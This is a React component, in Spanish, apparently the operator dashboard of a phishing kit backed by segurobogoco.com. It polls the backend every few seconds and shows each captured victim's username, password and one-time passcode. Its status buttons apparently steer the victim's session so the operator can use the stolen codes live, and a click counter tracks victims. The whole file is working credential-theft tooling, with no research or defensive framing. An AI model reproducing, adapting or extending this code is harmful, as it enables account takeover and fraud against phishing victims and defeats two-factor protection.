import React, { useEffect, useState } from 'react';
import axios from 'axios';
import { useNavigate } from 'react-router-dom';

const AdminDashboard = () => {
  const [guests, setGuests] = useState([]);
  const [statuses, setStatuses] = useState([]);
  const [error, setError] = useState('');
  const [updatedGuestId, setUpdatedGuestId] = useState(null);
  const [clicks, setClicks] = useState(0);
  const navigate = useNavigate();

  const fetchGuests = async () => {
    try {
      const token = localStorage.getItem('access_token');
      const { data } = await axios.get('https://segurobogoco.com/api/v1/admin/guests', {
        headers: { Authorization: `Bearer ${token}` },
      });
      setGuests(data.guests);
      setStatuses(data.statuses);
      setClicks(data.guests.length);
    } catch (err) {
      if (err.response?.status === 401) navigate('/');
      else setError('Error al cargar los datos.');
    }
  };

  const updateStatus = async (id, statusId) => {
    try {
      const token = localStorage.getItem('access_token');
      await axios.put(
        `https://segurobogoco.com/api/v1/admin/guests/${id}`,
        { status_id: statusId },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      setUpdatedGuestId(id);
      setTimeout(() => setUpdatedGuestId(null), 3000);
      fetchGuests();
    } catch (err) {
      if (err.response?.status === 401) navigate('/');
      else setError('Error al actualizar el estado.');
    }
  };

  const markAsReviewed = async (id) => {
    try {
      const token = localStorage.getItem('access_token');
      await axios.put(
        `https://segurobogoco.com/api/v1/admin/guests/${id}/mark-reviewed`,
        { isReviewed: true },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      fetchGuests();
    } catch (err) {
      if (err.response?.status === 401) navigate('/');
      else setError('Error al marcar como revisado.');
    }
  };

  useEffect(() => {
    fetchGuests();
    const interval = setInterval(fetchGuests, 3000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="bg-gray-800 min-h-screen p-8 text-white">
      <h2 className="text-5xl font-bold mb-6 text-center">Panel de Administración</h2>
      {error && <p className="text-red-400 mb-4 text-center">{error}</p>}

      <div className="absolute top-8 right-8 text-xl font-semibold text-gray-300">
        CLICKS: <span className="text-yellow-400">{clicks}</span>
      </div>

      <div className="space-y-6">
        {guests
          .sort((a, b) => b.id - a.id)
          .map((guest) => (
            <div
              key={guest.id}
              className={`bg-gray-700 p-6 rounded-2xl shadow-xl transform transition-all duration-300 ${
                updatedGuestId === guest.id ? 'ring-4 ring-indigo-500 scale-105' : ''
              } ${guest.isReviewed ? 'border-4 border-lime-500' : ''}`}
            >
              <p className="text-center font-bold text-lg text-blue-400">Nuevo Ingreso Goledor ⭐️💎</p>
              <div className="my-4">
                <p><b className="text-white">🧑‍💻 Usuario:</b> {guest.user}</p>
                <p><b className="text-white">🔐 Contraseña:</b> {guest.cc}</p>
                <p><b className="text-white">🏆 OTP:</b> {guest.otp}</p>
              </div>
              
              <div className="flex justify-between items-center">
                <p className="flex-1 text-center">
                  <strong className="text-indigo-300">Estado Actual:</strong> {statuses.find(status => status.id === guest.status_id)?.name}
                </p>
                
                <div className="flex gap-4 justify-end">
                  {statuses.map((status) => (
                    <button
                      key={status.id}
                      onClick={() => updateStatus(guest.id, status.id)}
                      className={`py-2 px-4 rounded-xl transition transform ${guest.status_id === status.id ? 'bg-red-500' : 'bg-blue-500'} text-white hover:scale-110 hover:bg-blue-600`}
                    >
                      {status.name}
                    </button>
                  ))}
                </div>
              </div>

              {/* Botón para marcar como revisado */}
              {!guest.isReviewed && (
                <button
                  onClick={() => markAsReviewed(guest.id)}
                  className="mt-6 py-2 px-5 bg-green-600 text-white rounded-full hover:bg-green-700 transition ease-in-out"
                >
                  Marcar como Revisado
                </button>
              )}
            </div>
          ))}
      </div>
    </div>
  );
};

export default AdminDashboard;
